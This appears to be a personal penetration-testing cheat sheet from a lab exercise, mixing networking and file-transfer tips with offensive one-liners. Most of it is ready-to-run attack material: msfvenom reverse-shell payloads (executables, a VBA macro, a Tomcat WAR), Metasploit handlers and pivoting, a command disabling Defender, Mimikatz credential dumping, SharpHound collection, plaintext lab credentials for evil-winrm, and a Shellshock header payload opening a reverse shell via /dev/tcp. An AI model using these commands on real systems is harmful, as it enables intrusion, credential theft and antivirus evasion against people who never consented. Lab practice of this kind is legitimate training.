# One Liners:
## Powershell one liner ping sweep
```powershell
100..255 | % {"192.168.0.$($_): $(Test-Connection -count 1 -comp 192.168.0.$($_) -quiet)"}
```

# File Transfers:
## From Linux to Windows:
-> There are many ways to transfer from linux to windows. One of the best ways that I use, is to create a server in the directory using `python -m SimpleHTTPServer` or `python3 -m http.server`. This will start a server on port 8000. The other is using SSH (See below to check the syntax). Another way to use FTP

## From Windows To Linux:
-> We can use SSH to copy from Windows to Linux. We'd firstly need to setup a ssh server.
```bash
scp file user@ip:/path/on/linux
```
-> We can also use FTP if the FTP Server has been setup on our linux box.
```bash
ftp ip
put file
```

# Networking:
## Fixing Internet and Asking DHCP for IP:
```bash
# ENS33 = interface
sudo ip link set ens33 up
sudo dhclient ens33 -v
```

## Adding a new route:
-> Adding a route to 192.168.0.101 via 10.10.10.15 (Gateway) and mask (255.255.255.0):
--> Windows:
```batch
route add 192.168.0.101 mask 255.255.255.0 10.10.10.15
```
--> Linux:
```bash
sudo ip route add 192.168.0.101 via 10.10.10.15
```

# Binary Exploitation
## Compiling binaries in 32-bit for BoFs:
```bash
gcc main.c -o main --no-stack-protector -z execstack -m32
# In case an error occurs about some file missing, try this command:
sudo apt-get install gcc-multilib
# and then this command
sudo apt-get install libx11-dev:i386 libx11-dev
```

## Finding offset of a function in a binary:
```bash

```

# Active Directory

## Stabalizing shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# CTRL-Z
stty raw -echo
fg
export TERM=screen
```
## Payloads:
```bash
# Windows Rev shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=55 -f exe  > rev.exe
# Excel macro using VBA
msfvenom -p windows/meterpreter/reverse\_tcp LHOST=tun0 LPORT=53 -f vba -o macro.vba
```

## Metasploit:
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lport 55
set lhost tun0
```

## Metasploit Setting up Socks Proxy
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost tun0
set lport 55
exploit
## Execute the pre-compiled version on prod
background
use post/multi/manage/autoroute
set SESSION 1
set SUBNET 10.200.19.0/24
exploit

use auxiliary/server/socks_proxy
set VERSION 4A
exploit
```

## If username exists in credguard and found in windows vault:
```bat
runas /savecred /user:admin-petersj /profile cmd.exe
```

## Disable AV using Powershell:
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Dumping with Mimikatz:
```bash
privilege::debug
token::elevate

lsadump::lsa /patch
sekurlsa::tickets /export

lsadump::sam
sekurlsa::logonPasswords
```

## Sharphound:
```bash
powershell -ep bypass
. .\\Sharphound.ps1
## OR
Import-Module .\\Sharphound.ps1
Invoke-Bloodhound -CollectionMethod All -Domain THROWBACK.local -ZipFileName loot.zip
```

## Transferring using SCP:
```bash
scp user@ip:/path/to/file outfile.ext
```

## Downloading Mimikatz onto the victim machine
```bash
mkdir mimikatz
cd mimikatz
wget 10.50.17.48:8000/mimikatz/mimidrv.sys -outfile mimidrv.sys
wget 10.50.17.48:8000/mimikatz/mimikatz.exe -outfile mimikatz.exe
wget 10.50.17.48:8000/mimikatz/mimilib.dll -outfile mimilib.dll
```

## Evil-Winrm:
```bash
# From THROWBACK-DC01 setup proxy and then use this to go into CORP-DC01
proxychains evil-winrm -i 10.200.19.118 -u mercerh -p pikapikachu7
```

# Misc:

## Shellshock Exploitation:

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/<YOUR IP>/<PORT> 0>&1' http://<Victim IP>/cgi-bin/<Script>
```

## MSFVenom:
```bash
# Simple Windows Reverse Shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=2225 -f exe > ms17–010.exe
# Windows Rev shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=55 -f exe  > rev.exe
# Raw Windows Rev Shell
msfvenom -p windows/x64/shell_reverse_tcp LPORT=443 LHOST=192.168.0.29 --platform windows -a x64 --format raw -o sc_x64_payload.bin
# Excel macro using VBA
msfvenom -p windows/meterpreter/reverse\_tcp LHOST=tun0 LPORT=53 -f vba -o macro.vba
# WAR Rev Shell for Apache Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

## Running commands of Languages in command line:
```bash
python -c 'print("Hello World!")'
perl -e 'system("echo Hi");'
ruby -e "system('echo hi')"
```

## Upload file on webserver using curl and PUT method:
```bash
curl -v -T <file_name> http://<IP>/<dir>/ -0
```

